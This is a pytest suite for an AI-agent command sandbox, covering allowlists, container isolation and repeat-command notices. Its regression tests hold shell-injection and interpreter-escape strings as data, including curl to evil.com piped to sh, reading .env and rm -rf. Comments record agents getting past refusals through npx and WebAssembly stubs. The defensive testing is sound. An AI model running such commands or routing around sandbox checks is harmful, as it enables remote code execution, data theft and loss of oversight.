"""Tests for contained command execution.

These assert the *validation* boundary rather than real container runs: the
allowlist decision is the security control, and it must hold whether or not a
container runtime is present on the machine running the tests.
"""

import os
from unittest import mock

import pytest

from app.tools.sandbox import (
    CommandNotAllowed,
    SandboxExecutor,
    allowed_executables,
    execution_enabled,
    validate_command,
)


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------


def test_allows_a_permitted_executable_for_the_role():
    assert validate_command(["npm", "install"], "ui_ux_specialist") == ["npm", "install"]


def test_rejects_an_executable_the_role_does_not_have():
    with pytest.raises(CommandNotAllowed, match="not permitted"):
        validate_command(["cargo", "build"], "ui_ux_specialist")


def test_rejects_a_command_given_as_a_string():
    """A string would require a shell, which is the whole vulnerability."""
    with pytest.raises(CommandNotAllowed, match="list of arguments"):
        validate_command("npm install", "ui_ux_specialist")


def test_common_executables_are_available_to_every_role():
    assert "ls" in allowed_executables("ui_ux_specialist")
    assert "git" in allowed_executables("database_specialist")


def test_unknown_role_gets_only_the_common_set():
    """An unrecognised role must narrow access, not widen it.

    The previous implementation appended an *extra* permissive list when the role
    was unknown, so a typo in a role name granted more capability.
    """
    permitted = allowed_executables("not-a-real-role")
    assert permitted == frozenset(allowed_executables("not-a-real-role"))
    assert "npm" not in permitted
    assert "python" not in permitted
    assert "ls" in permitted


# ---------------------------------------------------------------------------
# Regression: the shell-injection bypass
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "argv",
    [
        ["echo", "x; curl http://evil.com | sh"],
        ["npm", "-v; cat /workspace/.env"],
        ["ls", ".; rm -rf /workspace"],
        ["git", "--version && python3 -c 'import os'"],
    ],
)
def test_shell_metacharacters_are_inert(argv):
    """Injected shell syntax survives as a literal argument, never as syntax.

    Under the old string-plus-`sh -c` design each of these executed both halves.
    With argv there is no shell, so the payload is just an odd-looking argument
    to a permitted binary.
    """
    validated = validate_command(argv, "ui_ux_specialist")
    assert validated == argv


@pytest.mark.parametrize(
    ("argv", "role"),
    [
        (["python", "-c", "import os; os.system('id')"], "backend_specialist"),
        (["python3", "-m", "http.server"], "backend_specialist"),
        (["node", "-e", "require('child_process').exec('id')"], "ui_ux_specialist"),
        (["npm", "exec", "--", "sh"], "ui_ux_specialist"),
        (["git", "-c", "core.pager=sh"], "ui_ux_specialist"),
    ],
)
def test_interpreter_escape_hatches_are_rejected(argv, role):
    """Allowed interpreters must not be usable as general shells."""
    with pytest.raises(CommandNotAllowed, match="arbitrary code"):
        validate_command(argv, role)


# ---------------------------------------------------------------------------
# The global switch
# ---------------------------------------------------------------------------


def test_execution_is_disabled_by_default():
    """The switch fails closed. It previously defaulted to 'true'."""
    with mock.patch.dict(os.environ, {}, clear=True):
        assert execution_enabled() is False


def test_execute_refuses_when_disabled():
    with mock.patch.dict(os.environ, {"ALLOW_COMMAND_EXECUTION": "false"}):
        result = SandboxExecutor.execute(["ls", "-la"], repo_root=".", role_name="general")
        assert "disabled" in result["error"]


def test_execute_reports_a_rejected_command_without_running_anything():
    with mock.patch.dict(os.environ, {"ALLOW_COMMAND_EXECUTION": "true"}):
        result = SandboxExecutor.execute(["cargo", "build"], repo_root=".", role_name="ui_ux_specialist")
        assert "not permitted" in result["error"]


def test_execute_fails_closed_without_a_container_runtime(monkeypatch):
    """No runtime means no execution - never a fall back to the host."""
    monkeypatch.setattr("shutil.which", lambda _name: None)
    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        result = SandboxExecutor.execute(["ls"], repo_root=".", role_name="general")
        assert "container runtime" in result["error"]


def test_container_invocation_is_hardened(monkeypatch):
    """Every isolation flag must be present on the actual docker invocation.

    The mode is pinned rather than inherited: a developer whose `.env` selects
    in-container execution would otherwise have this pass without ever building
    a docker command line.
    """
    captured = {}

    class _Result:
        stdout, stderr, returncode = "", "", 0

    def _fake_run(cmd, **_kwargs):
        captured["cmd"] = cmd
        return _Result()

    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker" if name == "docker" else None)
    monkeypatch.setattr("subprocess.run", _fake_run)

    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        SandboxExecutor.execute(["ls"], repo_root=".", role_name="general")

    cmd = captured["cmd"]
    assert "--network" in cmd and cmd[cmd.index("--network") + 1] == "none"
    for flag in ("--memory", "--cpus", "--pids-limit", "--read-only"):
        assert flag in cmd
    assert cmd[cmd.index("--cap-drop") + 1] == "ALL"
    assert cmd[cmd.index("--security-opt") + 1] == "no-new-privileges"


def test_install_category_is_the_only_one_with_network(monkeypatch):
    captured = {}

    class _Result:
        stdout, stderr, returncode = "", "", 0

    monkeypatch.setattr("shutil.which", lambda name: "/usr/bin/docker" if name == "docker" else None)
    monkeypatch.setattr("subprocess.run", lambda cmd, **_k: (captured.update(cmd=cmd), _Result())[1])

    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        SandboxExecutor.execute(["npm", "install"], repo_root=".", role_name="ui_ux_specialist", category="install")
    assert captured["cmd"][captured["cmd"].index("--network") + 1] == "bridge"

    with mock.patch.dict(
        os.environ,
        {"ALLOW_COMMAND_EXECUTION": "true", "SANDBOX_EXECUTION_MODE": "container"},
    ):
        SandboxExecutor.execute(["npm", "test"], repo_root=".", role_name="ui_ux_specialist", category="test")
    assert captured["cmd"][captured["cmd"].index("--network") + 1] == "none"


# ---------------------------------------------------------------------------
# Command output must not teach the agent a path it cannot use
#
# A command runs with the workspace at its real host path, so anything it prints
# quotes that path. The agent reads it and uses it, and every filesystem tool it
# holds then fails - inside the agent the workspace is rooted at "/".
#
# Measured on run-0b55ad49: two stages called `ls` against that exact string
# four times each, every attempt returning path_not_found, and passed it to
# `node` and `read_file` besides. 64 of 378 tool calls in that run were repeats,
# and this was the single largest cause.
# ---------------------------------------------------------------------------


WORKSPACE = "/app/data/workspaces/low-run-0b55ad49-2918-4325-8534-1be504ee3927"


def test_a_host_path_in_output_becomes_workspace_relative():
    from app.tools.sandbox import _as_workspace_relative

    rewritten = _as_workspace_relative(
        f"Error: Cannot find module '{WORKSPACE}/simple-todo-list-app/verify.js'", WORKSPACE
    )

    assert WORKSPACE not in rewritten
    # Relative, not rooted: commands run with the workspace as their working
    # directory, so this is the form that works when the agent pastes it back.
    assert "simple-todo-list-app/verify.js" in rewritten
    assert "/simple-todo-list-app" not in rewritten


def test_a_rewritten_path_has_no_stray_separator():
    from app.tools.sandbox import _as_workspace_relative

    assert _as_workspace_relative(f"{WORKSPACE}/app.js:12", WORKSPACE) == "app.js:12"
    assert _as_workspace_relative(f"{WORKSPACE}/docs/spec.md", WORKSPACE) == "docs/spec.md"
    # The bare root is the workspace itself.
    assert _as_workspace_relative(f"cwd {WORKSPACE}", WORKSPACE) == "cwd ."


def test_output_without_the_path_is_untouched():
    from app.tools.sandbox import _as_workspace_relative

    text = "1 passed, 0 failed in 0.4s"
    assert _as_workspace_relative(text, WORKSPACE) == text


def test_a_missing_workspace_never_raises():
    """Narration and scrubbing must not be able to fail a command."""
    from app.tools.sandbox import _as_workspace_relative

    assert _as_workspace_relative("text", "") == "text"
    assert _as_workspace_relative("", WORKSPACE) == ""
    assert _as_workspace_relative("text", "/") == "text"


# ---------------------------------------------------------------------------
# Every role must be able to run its own work
#
# `ROLE_EXECUTABLES` is keyed by the name the sandbox is called with -
# `f"{role}_specialist"`. A key that matches no role is not an error anywhere:
# `allowed_executables` falls back to the common set and the role simply runs
# crippled. On run-0b55ad49 the frontend specialist was refused `node` eight
# times while building a web page, because the key said `ui_specialist` and the
# role is `ui_ux`. Three of six roles had no entry at all.
# ---------------------------------------------------------------------------


def test_every_specialist_role_has_an_allowlist():
    """A role with no entry runs with the common set and nobody is told."""
    import typing

    from app.agents.technical_lead import SpecialistRole
    from app.tools.sandbox import ROLE_EXECUTABLES

    missing = [
        f"{role}_specialist"
        for role in typing.get_args(SpecialistRole)
        if f"{role}_specialist" not in ROLE_EXECUTABLES
    ]

    assert not missing, f"no allowlist entry for: {', '.join(missing)}"


def test_no_allowlist_entry_matches_a_role_that_does_not_exist():
    """The other half: a misspelled key is dead weight that looks deliberate."""
    import typing

    from app.agents.technical_lead import SpecialistRole
    from app.tools.sandbox import ROLE_EXECUTABLES

    known = {f"{role}_specialist" for role in typing.get_args(SpecialistRole)}
    # Non-specialist agents legitimately have entries too.
    non_specialist = {"principal_architect"}
    orphans = set(ROLE_EXECUTABLES) - known - non_specialist

    assert not orphans, f"allowlist entries matching no role: {', '.join(sorted(orphans))}"


def test_a_role_that_builds_a_web_page_can_run_node():
    from app.tools.sandbox import allowed_executables

    assert "node" in allowed_executables("ui_ux_specialist")
    assert "npm" in allowed_executables("ui_ux_specialist")


def test_a_role_that_audits_an_application_can_run_it():
    from app.tools.sandbox import allowed_executables

    allowed = allowed_executables("security_reliability_specialist")
    assert "node" in allowed and "python3" in allowed


def test_read_only_inspection_is_available_to_every_role():
    """`grep` was 17 of 43 refusals, and each cost a model call to discover."""
    from app.tools.sandbox import allowed_executables

    for role in ("ui_ux_specialist", "documentation_specialist", "unknown_role"):
        assert "grep" in allowed_executables(role)


def test_an_unknown_role_still_gets_nothing_extra():
    """A typo must narrow access, never widen it."""
    from app.tools.sandbox import COMMON_EXECUTABLES, allowed_executables

    assert allowed_executables("not_a_role") == COMMON_EXECUTABLES


# ---------------------------------------------------------------------------
# Bounding memory must not bound address space
#
# `RLIMIT_AS` caps address space, and a modern runtime reserves far more of that
# than it uses: V8 and WebAssembly reserve multi-gigabyte contiguous ranges as a
# bounds-check trick and touch almost none of it. Against a 2 GB address-space
# cap, every WASM instantiation fails.
#
# On run-0b55ad49 that produced `WebAssembly.Instance(): Out of memory` 24
# times, the milestone review concluded "no test commands succeeded in the
# workspace", and agents had begun writing `WebAssembly = null` stubs to work
# around a limit that was never about their memory use.
# ---------------------------------------------------------------------------


def test_the_memory_cap_does_not_limit_address_space():
    """Same number, right knob: the heap is bounded, the reservation is not."""
    import os
    import resource
    import subprocess
    import sys

    from app.tools.sandbox import _apply_limits, _memory_limit_bytes

    probe = (
        "import resource;"
        "print(resource.getrlimit(resource.RLIMIT_AS)[0]);"
        "print(resource.getrlimit(resource.RLIMIT_DATA)[0])"
    )
    result = subprocess.run(
        [sys.executable, "-c", probe],
        capture_output=True, text=True, timeout=60,
        preexec_fn=_apply_limits,
    )
    address_space, data = (int(line) for line in result.stdout.split())

    assert address_space == resource.RLIM_INFINITY, (
        "address space must stay unbounded - capping it breaks every WASM runtime"
    )
    assert data == _memory_limit_bytes(), "the heap must still be bounded"
    assert os.getpgid(0) is not None  # sanity: the helper still ran


def test_a_runaway_allocation_is_still_stopped():
    """The bound has to keep working, or this is a regression dressed as a fix."""
    import subprocess
    import sys

    from app.tools.sandbox import _apply_limits

    # Ask for far more heap than the cap allows, in one go.
    greedy = "x = bytearray(8 * 1024**3); print('allocated')"
    result = subprocess.run(
        [sys.executable, "-c", greedy],
        capture_output=True, text=True, timeout=120,
        preexec_fn=_apply_limits,
    )

    assert result.returncode != 0, "an 8 GiB allocation must not succeed under a 2 GiB cap"
    assert "allocated" not in result.stdout


# ---------------------------------------------------------------------------
# A test runner the testing role can actually run
#
# The role whose job is running tests could run `pytest` and no JavaScript
# runner at all, on a brief that is explicitly HTML/CSS/JavaScript. The refusal
# bought nothing - `npx` was permitted, so `npx jest` ran jest anyway - and cost
# the agent a workaround: writing a test script into a root `package.json`,
# which is the manifest collision guarded below.
# ---------------------------------------------------------------------------


def test_the_testing_role_can_run_a_javascript_test_runner():
    from app.tools.sandbox import allowed_executables

    allowed = allowed_executables("testing_specialist")

    assert {"jest", "mocha", "vitest"} <= allowed
    assert "pytest" in allowed, "the Python runner must not be lost"


def test_a_test_runner_is_still_not_a_shell():
    """Widening the list must not admit a general interpreter."""
    from app.tools.sandbox import allowed_executables

    for role in ("testing_specialist", "ui_ux_specialist"):
        allowed = allowed_executables(role)
        assert "sh" not in allowed and "bash" not in allowed and "eval" not in allowed


# ---------------------------------------------------------------------------
# A package manager must not scaffold beside the project
#
# Commands run with the workspace root as their working directory, so
# `npm install` there creates `package.json` and `node_modules` beside a project
# that has its own. On run-0b55ad49 that meant jest 30 at the root running the
# project's jest-29 tests, and three remediation rounds spent on "Identifier
# 'jest' has already been declared". `write_artifact` already refused a root
# manifest; a package manager reached the same file through another door.
# ---------------------------------------------------------------------------


def _pinned(tmp_path, name="todo-app"):
    (tmp_path / ".project-directory").write_text(f"{name}\n")
    return str(tmp_path)


def test_installing_at_the_root_is_refused_once_a_project_is_pinned(tmp_path):
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    refusal = guard(["npm", "install"], _pinned(tmp_path))

    assert refusal is not None
    assert "todo-app" in refusal, "the refusal must name where it belongs"
    assert "--prefix" in refusal, "and how to get there"


def test_aiming_the_package_manager_at_the_project_is_allowed(tmp_path):
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    root = _pinned(tmp_path)

    assert guard(["npm", "install", "--prefix", "todo-app"], root) is None
    assert guard(["npm", "install", "--prefix=todo-app"], root) is None


def test_commands_that_write_no_manifest_are_untouched(tmp_path):
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    root = _pinned(tmp_path)

    for command in (["npm", "test"], ["npx", "jest"], ["ls", "-R"], ["node", "app.js"]):
        assert guard(command, root) is None, command


def test_nothing_is_refused_before_a_project_exists(tmp_path):
    """The first scaffold has nothing to collide with."""
    from app.tools.sandbox import manifest_written_outside_the_project as guard

    assert guard(["npm", "init", "-y"], str(tmp_path)) is None


def test_the_refusal_reaches_the_agent_as_a_tool_result(tmp_path, monkeypatch):
    """A guard that raises would crash the stage instead of correcting it.

    Execution is enabled explicitly. Without that this test passed only when
    some earlier test in the session had called `load_settings()`, which runs
    `load_dotenv` and puts the developer's `.env` into `os.environ` for the rest
    of the process - `ALLOW_COMMAND_EXECUTION` among it. So the assertion held in
    a full-suite run and failed when this file was run on its own, where
    `execute` returns "Command execution is disabled" before reaching any guard.

    A test whose result depends on which tests ran before it, and on a file that
    is not in the repository, is not testing what it says. What it means to check
    is that the guard's refusal comes back as a tool result, which requires
    getting as far as the guard.
    """
    monkeypatch.setenv("ALLOW_COMMAND_EXECUTION", "true")
    from app.tools.sandbox import SandboxExecutor

    result = SandboxExecutor.execute(
        command=["npm", "install"], repo_root=_pinned(tmp_path),
        role_name="testing_specialist", category="install",
    )

    assert "error" in result
    assert "todo-app" in result["error"]


# --- commands that never exit -------------------------------------------


def test_a_static_file_server_is_refused_rather_than_timed_out() -> None:
    """Half of every command timeout on record.

    An agent wants to "open the page", there is no browser here to open it
    with, and the server then serves nobody until the 120-second timeout kills
    it. Every one of these is a real call from a stored run that returned
    nothing after two minutes:

        run-cbd22a34  npx serve . -p 8000       (and retried without the dot)
        run-cbb1a5fc  npx http-server -p 8765 --silent
        run-2eb3aa24  npx --yes serve -p 3000   (retried)

    A refusal costs nothing and says what to do instead. This is the shape of
    the `node -e` refusal, which works: run-5d83e946 hit it twice and the agent
    put the code in a file both times.
    """
    import pytest

    from app.tools.sandbox import CommandNotAllowed, validate_command

    for argv in (
        ["npx", "serve", ".", "-p", "8000"],
        ["npx", "--yes", "serve", "-p", "3000"],
        ["npx", "http-server", "-p", "8765", "--silent"],
    ):
        with pytest.raises(CommandNotAllowed) as refusal:
            validate_command(argv, "ui_ux_specialist")
        assert "runs until it is stopped" in str(refusal.value)
        # It must say what to do instead, or it only moves the behaviour.
        # The alternative is now named by the workspace: with a browser runner
        # installed, Playwright's `webServer` is the supported route and it
        # works - run-35424714 served this very way and ran 34 browser tests.
        # Without one, the advice is to call the module directly. Asserted on
        # the guarantee rather than on one wording of it.
        assert "webServer" in str(refusal.value)
        assert "call it from a test" in str(refusal.value)

    # `python3 -m http.server` is the same idea from the other language, and
    # the module allowlist already refuses it - with its own wording. Asserted
    # as "refused", not "refused by this guard", so whichever catches it first
    # keeps the behaviour.
    with pytest.raises(CommandNotAllowed):
        validate_command(["python3", "-m", "http.server"], "ui_ux_specialist")


def test_the_commands_the_workflow_depends_on_are_not_refused() -> None:
    """A guard that catches the test runner would cost far more than it saves."""
    from app.tools.sandbox import _starts_a_server

    for argv in (
        ["node", "--test", "app.test.mjs"],
        ["npm", "test"],
        ["npx", "jest", "--verbose"],
        ["node", "--check", "app.js"],
        ["npx", "vite", "build"],
    ):
        assert _starts_a_server(argv) is None, argv


def test_a_timeout_says_why_a_command_might_not_finish() -> None:
    """"Command timed out" alone tells an agent nothing about the cause.

    The commonest cause is not slowness: it is a command that was never going
    to exit. The name check refuses the ones it can recognise, but
    run-2eb3aa24's ui specialist wrote its own server, `node serve-test.mjs`,
    and ran it twice for 120 seconds each. No name check can catch that; the
    message it gets back can still explain it.
    """
    import inspect

    from app.tools import sandbox

    source = inspect.getsource(sandbox)
    # Every message that tells an agent a command timed out carries it, rather
    # than a fixed count of uses. Reaching one of two is the mistake this
    # codebase keeps making, but a number has to be edited whenever a third
    # place is added - which is the moment this check should be doing its work
    # instead of failing. A third was added: the pre-run refusal of a command
    # that has already timed out.
    import re

    # Every "Command timed out after N seconds." the executor produces, with
    # whatever follows it on the same line. Narrow on purpose: a looser pattern
    # matched `"timed out" in str(...)` inside the ledger check, which is a
    # substring test and not a message to anyone.
    messages = re.findall(r'f"Command timed out after[^"]*"[^\n]*', source)
    assert len(messages) >= 2, f"expected both run paths, found {len(messages)}"
    # Either the constant or the chooser that returns one of the two variants:
    # a workspace with a browser runner installed is told something different
    # and true. See `_timeout_advice`.
    without = [
        m for m in messages
        if "_TIMEOUT_ADVICE" not in m and "_timeout_advice(" not in m
    ]
    assert not without, f"these timeout messages do not carry the advice: {without}"

    # The pre-run refusal of a command that already timed out carries it too,
    # and is checked by calling it: see
    # `test_the_refusal_keeps_the_advice_the_timeout_gives`.
    assert "usually one that was not meant to" in sandbox._TIMEOUT_ADVICE
    assert "import it and call it" in sandbox._TIMEOUT_ADVICE
    # Both variants explain the cause; only the remedy differs.
    assert (
        "usually one that was not meant to"
        in sandbox._TIMEOUT_ADVICE_WITH_A_BROWSER
    )


# --- the project directory written twice ---------------------------------


def test_a_doubled_project_directory_is_repaired(tmp_path) -> None:
    """`todo-app/todo-app/app.test.mjs` exists nowhere.

    An agent that sets `working_directory` to the project and then writes the
    project into the path as well produces it. Seen in at least seven runs:
    run-2b5def74, run-61c5a5b6 (six times), run-cbb1a5fc, run-da6c5e19,
    run-2eb3aa24. Nothing says whether a path argument resolves against the
    workspace root or against `working_directory`, so the agent guesses.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "todo-app").mkdir()
    (tmp_path / "todo-app/app.test.mjs").write_text("//\n", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "--test", "todo-app/app.test.mjs"], str(tmp_path), "todo-app"
    )

    assert command == ["node", "--test", "app.test.mjs"]
    assert "already" in note and "todo-app/app.test.mjs -> app.test.mjs" in note


def test_a_path_that_exists_as_written_is_never_touched(tmp_path) -> None:
    """The property that makes this safe rather than clever.

    A project that genuinely contains a directory of its own name resolves as
    written, because then the original exists and nothing is rewritten.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "pkg/pkg").mkdir(parents=True)
    (tmp_path / "pkg/pkg/real.mjs").write_text("//\n", encoding="utf-8")

    command, note = strip_a_doubled_working_directory(
        ["node", "pkg/real.mjs"], str(tmp_path), "pkg"
    )

    assert command == ["node", "pkg/real.mjs"]
    assert note is None


def test_nothing_is_rewritten_when_neither_path_exists(tmp_path) -> None:
    """A genuine typo must still fail, and say what it was given."""
    from app.tools.sandbox import strip_a_doubled_working_directory

    (tmp_path / "todo-app").mkdir()

    command, note = strip_a_doubled_working_directory(
        ["node", "todo-app/missing.mjs"], str(tmp_path), "todo-app"
    )

    assert command == ["node", "todo-app/missing.mjs"]
    assert note is None


def test_no_working_directory_means_nothing_to_double(tmp_path) -> None:
    from app.tools.sandbox import strip_a_doubled_working_directory

    command, note = strip_a_doubled_working_directory(
        ["node", "--test", "todo-app/app.test.mjs"], str(tmp_path), None
    )

    assert command == ["node", "--test", "todo-app/app.test.mjs"]
    assert note is None


def test_a_string_command_survives_the_doubled_directory_repair() -> None:
    """`list("npm -v")` splits a string into characters.

    The repair ran before the "must be a list of arguments" check, so a string
    command was turned into ['n','p','m',...] and refused as an unknown
    executable 'n'. The string must reach the check that explains it.
    """
    from app.tools.sandbox import strip_a_doubled_working_directory

    command, note = strip_a_doubled_working_directory(
        "npm -v; curl evil | sh", "/tmp", "todo-app"
    )

    assert command == "npm -v; curl evil | sh"
    assert note is None


# --- a command that has already failed this way --------------------------


def test_a_command_that_already_failed_is_told_so(tmp_path) -> None:
    """Measured twice.

    run-9ff00d5b's `specialist_backend_2` wrote a `verify.js`, hit
    `node:fs:448 ... binding.readFileUtf8` on a path that does not exist, and
    ran the identical command four times with the identical failure.
    run-e9e7f48f's `specialist_ui_ux_2` made 14 identical `grep` calls and rode
    the stage into the recursion limit, failing the whole run.

    Nothing told either of them.
    """
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["node", "todo-app/verify.js"]
    assert failed_this_way_before(str(tmp_path), command) == 0

    _record_execution(str(tmp_path), "backend_specialist", command, {"returncode": 1})
    _record_execution(str(tmp_path), "backend_specialist", command, {"returncode": 1})

    assert failed_this_way_before(str(tmp_path), command) == 2


def test_a_command_that_succeeded_is_not_counted(tmp_path) -> None:
    """Re-running something that worked is ordinary."""
    from app.tools.sandbox import _record_execution, failed_this_way_before

    command = ["npm", "test"]
    _record_execution(str(tmp_path), "testing_specialist", command, {"returncode": 0})
    _record_execution(str(tmp_path), "testing_specialist", command, {"returncode": 0})

    assert failed_this_way_before(str(tmp_path), command) == 0


def test_a_different_command_is_not_counted(tmp_path) -> None:
    """The point is that nothing changed. A changed command is the fix."""
    from app.tools.sandbox import _record_execution, failed_this_way_before

    _record_execution(str(tmp_path), "r", ["node", "a.js"], {"returncode": 1})

    assert failed_this_way_before(str(tmp_path), ["node", "b.js"]) == 0
    assert failed_this_way_before(str(tmp_path), ["node", "a.js"]) == 1


def test_an_unwritable_ledger_never_fails_the_command() -> None:
    """A hint must not be able to break the thing it is hinting about."""
    from app.tools.sandbox import failed_this_way_before

    assert failed_this_way_before("/definitely/not/here", ["node", "a.js"]) == 0


def test_an_edit_clears_the_previous_failure(tmp_path) -> None:
    """The false positive this check shipped with.

    Caught live on run-37476645's `specialist_testing_2`, in the first run
    after the check shipped. The trace is EDIT, RUN, EDIT, RUN, EDIT, RUN - a
    specialist debugging a suite exactly as it should - and it was told
    twenty-six times that it had changed nothing and should change something.

    The settled-answer middleware and both repeat-read notices already treat a
    write as invalidating what came before. This did not, and should have.
    """
    import time

    from app.tools.sandbox import _record_execution, failed_this_way_before

    (tmp_path / "proj").mkdir()
    suite = tmp_path / "proj/app.test.mjs"
    suite.write_text("v1\n", encoding="utf-8")
    command = ["node", "--test", "proj/app.test.mjs"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 1})
    time.sleep(0.02)
    assert failed_this_way_before(str(tmp_path), command) == 1

    suite.write_text("v2 - the agent fixed it\n", encoding="utf-8")

    assert failed_this_way_before(str(tmp_path), command) == 0


def test_a_failure_with_nothing_written_since_still_counts(tmp_path) -> None:
    """The case the check exists for: run-e9e7f48f's 14 identical greps and
    run-9ff00d5b's four identical failing commands, neither preceded by a
    change of any kind."""
    import time

    from app.tools.sandbox import _record_execution, failed_this_way_before

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj/a.js").write_text("x\n", encoding="utf-8")
    command = ["node", "proj/a.js"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 1})
    time.sleep(0.02)
    _record_execution(str(tmp_path), "r", command, {"returncode": 1})
    time.sleep(0.02)

    assert failed_this_way_before(str(tmp_path), command) == 2


def test_a_write_outside_the_command_directory_does_not_clear_the_count(
    tmp_path,
) -> None:
    """A workflow's own rendered documents must not silence the repeat notice.

    The gate exists so an agent that edits the file under test is not told
    "nothing has changed". The whole-workspace walk it used applied that same
    logic to files the command never touched: between two stages the workflow
    rewrites `docs/milestone_review.md`, and that single write reset the
    failure count to zero. On run-2bfa5e6e a `npm test` failing on a missing
    `package.json` was re-run across three stages and the "already failed"
    note never fired once.
    """
    import time

    from app.tools.sandbox import _record_execution, failed_this_way_before

    (tmp_path / "proj").mkdir()
    (tmp_path / "docs").mkdir()
    (tmp_path / "proj/a.js").write_text("x\n", encoding="utf-8")
    command = ["node", "a.js"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 1}, "proj")
    time.sleep(0.02)
    # The workflow renders a review document between stages. The command runs
    # under `proj` and never reads it.
    (tmp_path / "docs/milestone_review.md").write_text("rendered\n", encoding="utf-8")
    time.sleep(0.02)
    _record_execution(str(tmp_path), "r", command, {"returncode": 1}, "proj")
    time.sleep(0.02)

    assert failed_this_way_before(str(tmp_path), command, "proj") == 2


def test_a_write_in_the_command_directory_does_clear_the_count(tmp_path) -> None:
    """The behaviour the gate exists to preserve.

    An agent that edits the file under test and re-runs has genuinely changed
    the situation, so the failure from before the edit is no longer live. The
    count is the failures with nothing written since them, so a write between
    two failures prunes the first: without the write both count (two), with it
    only the later, still-live one does (one).
    """
    import time

    from app.tools.sandbox import _record_execution, failed_this_way_before

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj/a.js").write_text("x\n", encoding="utf-8")
    command = ["node", "a.js"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 1}, "proj")
    time.sleep(0.02)
    (tmp_path / "proj/a.js").write_text("y\n", encoding="utf-8")
    time.sleep(0.02)
    _record_execution(str(tmp_path), "r", command, {"returncode": 1}, "proj")
    time.sleep(0.02)

    # The first failure is pruned by the edit; the second has nothing written
    # since it and so is still live.
    assert failed_this_way_before(str(tmp_path), command, "proj") == 1


def test_a_command_that_already_passed_unchanged_is_counted(tmp_path) -> None:
    """The leak the failure-side check left open.

    Measured on run-ae4b717e's `specialist_ui_ux_1`: eleven identical
    `node -c task-manager/app.js`, every one exit 0 with empty output and no
    write between any of them. Worse on run-9ff00d5b's `test_round_0`: one
    passing `node --test todo-app/app.test.mjs` run twenty-eight times, and
    that run died in the recursion limit.
    """
    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    command = ["node", "-c", "task-manager/app.js"]
    assert succeeded_this_way_before(str(tmp_path), command) == 0

    _record_execution(str(tmp_path), "ui_ux_specialist", command, {"returncode": 0})
    _record_execution(str(tmp_path), "ui_ux_specialist", command, {"returncode": 0})

    assert succeeded_this_way_before(str(tmp_path), command) == 2


def test_a_command_that_failed_is_not_counted_as_a_pass(tmp_path) -> None:
    """Retrying something broken is the behaviour the other check owns."""
    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    command = ["node", "verify.js"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 1})

    assert succeeded_this_way_before(str(tmp_path), command) == 0


def test_a_write_clears_the_previous_pass(tmp_path) -> None:
    """The same lesson finding 73 taught the failure side.

    A specialist that edits the file under test and re-runs the suite has
    changed the situation, and "you already have this result" is then false.
    """
    import time

    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    (tmp_path / "proj").mkdir()
    suite = tmp_path / "proj/app.test.mjs"
    suite.write_text("v1\n", encoding="utf-8")
    command = ["node", "--test", "proj/app.test.mjs"]

    _record_execution(str(tmp_path), "r", command, {"returncode": 0})
    assert succeeded_this_way_before(str(tmp_path), command) == 1

    time.sleep(0.01)
    suite.write_text("v2\n", encoding="utf-8")

    assert succeeded_this_way_before(str(tmp_path), command) == 0


def test_the_agent_s_own_package_cache_is_not_a_change(tmp_path) -> None:
    """The sandbox puts HOME and npm's cache inside the workspace.

    If a blob landing under `node_modules` or `.agent-home` counted as a
    change, the note would never fire in any run that had installed anything -
    which is every run that gets far enough to matter.
    """
    import time

    from app.tools.sandbox import _record_execution, succeeded_this_way_before

    (tmp_path / "proj").mkdir()
    (tmp_path / "proj/app.js").write_text("x\n", encoding="utf-8")
    command = ["node", "-c", "proj/app.js"]
    _record_execution(str(tmp_path), "r", command, {"returncode": 0})

    time.sleep(0.01)
    cache = tmp_path / "node_modules/left-pad"
    cache.mkdir(parents=True)
    (cache / "index.js").write_text("installed\n", encoding="utf-8")

    assert succeeded_this_way_before(str(tmp_path), command) == 1


def test_an_unreadable_ledger_never_fails_the_command() -> None:
    from app.tools.sandbox import succeeded_this_way_before

    assert succeeded_this_way_before("/definitely/not/here", ["node", "a.js"]) == 0


def test_the_note_tells_a_finished_verification_to_answer(tmp_path) -> None:
    """The two halves say "you already have this" and then ask for opposite moves."""
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["node", "--test", "proj/app.test.mjs"]
    root = str(tmp_path)
    assert _note_about_running_this_again(root, command, {"returncode": 0}, "r") == ""

    _record_execution(root, "r", command, {"returncode": 0})
    note = _note_about_running_this_again(root, command, {"returncode": 0}, "r")

    assert "already passed 1 time(s)" in note
    assert "return your structured answer" in note
    assert "will fail again" not in note


def test_the_note_still_tells_a_repeated_failure_to_change_something(tmp_path) -> None:
    from app.tools.sandbox import _note_about_running_this_again, _record_execution

    command = ["node", "verify.js"]
    root = str(tmp_path)
    _record_execution(root, "r", command, {"returncode": 1})

    note = _note_about_running_this_again(root, command, {"returncode": 1}, "r")

    assert "already failed 1 time(s)" in note
    assert "will fail again" in note


def test_a_refused_command_gets_no_note(tmp_path) -> None:
    """A refusal has no exit code, and neither check has anything to say."""
    from app.tools.sandbox import _note_about_running_this_again

    assert _note_about_running_this_again(str(tmp_path), ["node", "a.js"], {"error": "no"}, "r") == ""


